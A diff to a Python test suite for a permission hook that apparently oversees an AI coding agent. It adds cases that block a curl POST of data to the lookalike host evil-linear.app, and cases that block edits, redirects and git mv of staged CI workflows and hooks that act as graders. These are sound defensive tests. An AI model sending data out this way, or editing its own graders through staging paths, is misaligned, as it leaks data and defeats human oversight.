@@ -666,6 +666,12 @@ def main():
          bash("curl -X POST https://registry.npmjs.org/-/v1/login"), ALLOW, HOOK),
         ("curl -X POST -d to api.linear.app allowed (stack-specific allowlist)",
          bash("curl -X POST -d 'q=1' https://api.linear.app/graphql"), ALLOW, HOOK),
+        # The PREFIX lookalike, for the stack-specific tier. The suffix shape
+        # (`linear.app.evil.tld`) is covered above; this is the other half of the
+        # domain-boundary claim — `host.endswith("." + s)` must not be satisfied
+        # by a host that merely ENDS IN the allowlisted string.
+        ("curl --data to lookalike evil-linear.app blocked (domain boundary)",
+         bash("curl --data 'q=1' https://evil-linear.app/graphql"), BLOCK, HOOK),
         ("plain GET to unknown host allowed (no exfil shape)",
          bash("curl https://evil-github.com/README.md"), ALLOW, HOOK),
 
@@ -948,6 +954,9 @@ def main():
         ("pipeline off: sed -i on a CI workflow allowed",
          bash(f"sed -i 's/a/b/' {os.path.join(feat_root, '.github/workflows/ci.yml')}"),
          ALLOW, feat_hook),
+        ("pipeline off: editing a STAGED workflow allowed",
+         edit(os.path.join(feat_root, "templates/workflows/pipeline-review.yml"), "x"),
+         ALLOW, feat_hook),
 
         # ── grader-path protection, place 1 of 2: the Edit/Write glob set ─────
         ("grader: Edit a CI workflow blocked in a pinned session",
@@ -960,6 +969,29 @@ def main():
          edit(os.path.join(pl_root, "src/app.ts"), "x"), ALLOW, pl_hook),
         ("grader: UNPINNED session may edit a workflow (withholding check fails open)",
          edit(os.path.join(pl_nopin_root, ".github/workflows/ci.yml"), "x"), ALLOW, pl_nopin),
+
+        # ── staging mirrors: the bytes are decided here, not at activation ────
+        # `templates/` holds the inert copies that BECOME the guarded paths at
+        # bootstrap (templates/README.md is the activation table). Gating only
+        # the destination means the session picks the bytes and the later
+        # `git mv` reads as "just a move".
+        ("grader: Edit a STAGED pipeline workflow blocked (→ .github/workflows/**)",
+         edit(os.path.join(pl_root, "templates/workflows/pipeline-review.yml"), "x"),
+         BLOCK, pl_hook),
+        ("grader: Edit a STAGED stack workflow blocked (whole dir, not pipeline-* only)",
+         edit(os.path.join(pl_root, "templates/workflows/deploy-on-green.yml"), "x"),
+         BLOCK, pl_hook),
+        ("grader: Write a STAGED hook blocked (→ .claude/hooks/**, self-protected)",
+         write(os.path.join(pl_root, "templates/hooks/session-start-provision-env.sh"), "x"),
+         BLOCK, pl_hook),
+        ("grader: templates/README.md still editable (glob does not over-reach)",
+         edit(os.path.join(pl_root, "templates/README.md"), "x"), ALLOW, pl_hook),
+        ("grader: a staged SCRIPT is not floored (templates/scripts is not a mirror)",
+         edit(os.path.join(pl_root, "templates/scripts/check-migrations.mjs"), "x"),
+         ALLOW, pl_hook),
+        ("grader: UNPINNED session may edit a staged workflow",
+         edit(os.path.join(pl_nopin_root, "templates/workflows/pipeline-review.yml"), "x"),
+         ALLOW, pl_nopin),
 
         # ── grader-path protection, place 2 of 2: the Bash mutation regex ─────
         ("grader Bash: redirect into a workflow blocked",
@@ -981,6 +1013,24 @@ def main():
         ("grader Bash: UNPINNED session may sed -i a workflow",
          bash(f"sed -i 's/a/b/' {os.path.join(pl_nopin_root, '.github/workflows/ci.yml')}"),
          ALLOW, pl_nopin),
+
+        # ── staging mirrors, Bash half ───────────────────────────────────────
+        ("grader Bash: sed -i a staged workflow blocked",
+         bash(f"sed -i 's/a/b/' {os.path.join(pl_root, 'templates/workflows/pipeline-dispatch.yml')}"),
+         BLOCK, pl_hook),
+        ("grader Bash: redirect into a staged hook blocked",
+         bash(f"echo x > {os.path.join(pl_root, 'templates/hooks/session-start-provision-env.sh')}"),
+         BLOCK, pl_hook),
+        # The activation move itself. It was already blocked by its DESTINATION
+        # under `.github/workflows/**`; it is asserted here so the pair — source
+        # staged, destination active — is regression-gated together.
+        ("grader Bash: git mv activating a staged workflow blocked",
+         bash(f"git mv {os.path.join(pl_root, 'templates/workflows/pipeline-review.yml')} "
+              f"{os.path.join(pl_root, '.github/workflows/pipeline-review.yml')}"),
+         BLOCK, pl_hook),
+        ("grader Bash: cat a staged workflow allowed (read)",
+         bash(f"cat {os.path.join(pl_root, 'templates/workflows/pipeline-review.yml')}"),
+         ALLOW, pl_hook),
 
         # ── ticket-branch: the branch must carry the PINNED id, case-insensitively
         ("ticket-branch: matching lower-cased branch allowed",
